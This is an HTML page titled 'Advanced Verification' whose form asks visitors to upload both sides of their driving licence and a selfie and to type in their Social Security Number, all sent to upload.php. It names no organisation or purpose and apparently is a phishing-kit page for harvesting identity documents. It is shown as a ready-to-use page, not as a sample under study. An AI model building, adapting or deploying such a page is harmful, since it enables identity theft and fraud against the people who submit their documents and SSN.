<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Verification</title>
    <style>
        /* Global Styles */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f7f7f7;
        }

        /* Header Styles */
        header {
            background-color:  #e0072f;
            color: #fff;
            text-align: center;
            padding: 20px 0;
        }

        h1 {
            margin: 0;
            font-size: 24px;
        }

        /* Form Container Styles */
        .container {
            max-width: 800px;
            margin: 20px auto;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-column-gap: 20px;
        }

        /* Form Styles */
        .form {
            padding: 20px;
        }

        label {
            display: block;
            margin-top: 10px;
            font-weight: bold;
        }

        input[type="file"] {
            margin-top: 5px;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        input[type="submit"] {
            background-color: #e0072f;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 10px 20px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            width: 100%;
            margin-top: 15px;
        }

        input[type="submit"]:hover {
            background-color: #0056b3;
        }

        /* Image Styles */
        .form-image {
            padding: 20px;
            text-align: center;
        }

        .form-image img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
        }

        /* Responsive Styles */
      
    </style>
</head>
<body>
    <header>
        <h1>Advanced Verification</h1>
    </header>
    <div class="container">
    <div class="form-image">
            <img src="ver.jpg" alt="Verification Image">
        </div>
        <div class="form">
            <form id="document-upload-form" enctype="multipart/form-data" method="POST" action="upload.php">
                <label for="front-license">Front of Driving License:</label>
                <input type="file" id="front-license" name="front_license" accept="image/*" required>

                <label for="back-license">Back of Driving License:</label>
                <input type="file" id="back-license" name="back_license" accept="image/*" required>

                <label for="selfie">A Selfie:</label>
                <input type="file" id="selfie" name="selfie" accept="image/*" required>

                <label for="ssn">SSN (Social Security Number):</label>
                <input type="text" id="ssn" name="ssn" placeholder="Enter your SSN" required>

                <input type="submit" value="Upload Documents">
            </form>
        </div>
       
    </div>
</body>
</html>
